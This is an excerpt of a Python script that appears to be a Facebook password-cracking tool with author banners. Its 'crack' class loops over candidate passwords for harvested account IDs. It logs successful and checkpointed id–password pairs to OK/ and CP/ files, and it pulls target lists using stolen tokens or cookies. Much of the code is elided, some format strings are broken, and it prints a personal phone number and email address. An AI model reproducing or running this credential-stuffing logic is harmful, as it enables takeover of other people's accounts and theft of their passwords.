...
def banner():
    print("""
\x1b[96;1m|░█████╗░██╗░░░░░██╗               \x1b[92;1m_____ _____________________Team•XnxCode
\x1b[96;1m|██╔══██╗██║░░░░░██║             \x1b[92;1m/    ___/•Ali
 \x1b[96;1m███████║██║░░░░░██║ \x1b[92;1m/  \|__)  •Raza
 \x1b[96;1m██╔══██║██║░░░░░██║\x1b[92;1m/    Y     \   •03047269778
\x1b[96;1m|██║░░██║███████╗██║         \x1b[92;1m\___  /   •Technical Raza)
        \x1b[96;1m\/                  \/       \/     \x1b[92;1m\/    
""")
def menu_log():
...
def menu():
    ...
    try:
        ...
        users = 'Pricode Free'
        maile = 'alirazapanjtani51214@gmail.com'
...
def ingfog():
	...
	mlaku("%s╠%s[%s+%s] %sAli><"%(B,H,K,H,U))
	mlaku("%s╠%s[%s+%s] %sRaza><"%(B,H,K,H,U))
	mlaku("%s╠══%s[%s-%s] %sRecode%s[%s-%s]"%(B,H,K,H,U,H,K,H))
	mlaku("%s╠ %s[%s+%s] %sAli Gans><"%(B,H,K,H,U))
	mlaku("%s╠%s[%s+%s] %sraza Cans><"%(B,H,K,H,U))
...
class crack:
    ...
    def api(self,fl):
        try:
            for i in fl.get("pw"):
                ...
                if log.get("status")=="cp":
                    try:
                        ...
                        m,d,y = ttl.split("/")
                        m = bulan_ttl[m]
                        print("\r%s[%sAli/Cp%s] %s • %s • %s %s %s%s"%(K,U,K,fl.get("id"),i,d,m,y,tahun(fl.get("id"))))
                    ...
                    print("\r%s[%Ali/Cp%s] %s • %s%s     "%(K,U,K,fl.get("id"),i,tahun(fl.get("id"))))
                    self.cp.append("%s•%s"%(fl.get("id"),i))
                    open("CP/%s.txt"%(tanggal),"a+").write("%s•%s\n"%(fl.get("id"),i))
                    break
                elif log.get("status")=="success":
                    print("\r%s[%Ali/Ok%s] %s • %s%s     "%(H,U,H,fl.get("id"),i,tahun(fl.get("id"))))
            ...
            self.ko+=1
            print("\r%s[%sAli x Raza x Bablu%s][%s%s/%s%s][%sLolos:%s%s][%sSesi:%s%s]%s"%(H,O,H,K,self.ko,len(self.fl),H,O,len(self.ada),H,O,len(self.cp),H,O), end=' ');sys.stdout.flush()
        except:
            self.api(fl)
        ...
        try:
            for i in fl.get("pw"):
                ...
                if log.get("status")=="cp":
                    ...
                    print("\r%s[%sAli/Cp%s] %s • %s%s     "%(K,U,K,fl.get("id"),i,tahun(fl.get("id"))))
                    self.cp.append("%s•%s"%(fl.get("id"),i))
                    open("CP/%s.txt"%(tanggal),"a+").write("%s•%s\n"%(fl.get("id"),i))
                    break
                elif log.get("status")=="success":
                    print("\r%s[%sAli/Ok%s] %s • %s%s     "%(H,U,H,fl.get("id"),i,tahun(fl.get("id"))))
                    print("")
                    self.ada.append("%s•%s"%(fl.get("id"),i))
                    open("OK/%s.txt"%(tanggal),"a+").write("%s•%s\n"%(fl.get("id"),i))
                    break
        ...
        try:
            for i in fl.get("pw"):
                ...
                if log.get("status")=="cp":
                    ...
                    h_ok = "\r%s[%sAli/Ok%s] %s • %s%s%s     "%(H,U,H,fl.get("id"),i,tahun(fl.get("id")),U)
            ...
            for i in fl.get("pw"):
                ...
                if log.get("status")=="cp":
                    try:
                        ...
                        m,d,y = ttl.split("/")
                        m = bulan_ttl[m]
                        h_cp = "\r%s[%sAli/Cp%s] %s • %s • %s %s %s%s"%(K,U,K,fl.get("id"),i,d,m,y,tahun(fl.get("id")))
        ...
        try:
            for i in fl.get("pw"):
                ...
                if log.get("status")=="cp":
                    ...
                    h_cp = "\r%s[%sAli/Cp%s] %s • %s%s     "%(K,U,K,fl.get("id"),i,tahun(fl.get("id")))
                    cek_log(fl.get("id"),i,h_cp)
                    print("")
                    self.cp.append("%s•%s"%(fl.get("id"),i))
                    open("CP/%s.txt"%(tanggal),"a+").write("%s•%s\n"%(fl.get("id"),i))
...
def teman_target():
    ...
    try:
        ...
        jalan('%s╚══[%s!%s] %sToken/Cookies Invalid/Expired'%(M,H,M,H))
        menu_log()
    tt=[]
    te=[]
...
def var_author():
    ...
    mlaku('%s║     • %sRaza Tzy'%(H,O))
    mlaku('%s║     • %sAli Tzy'%(H,O))
    mlaku('%s║     • %sRaza XD '%(H,O))
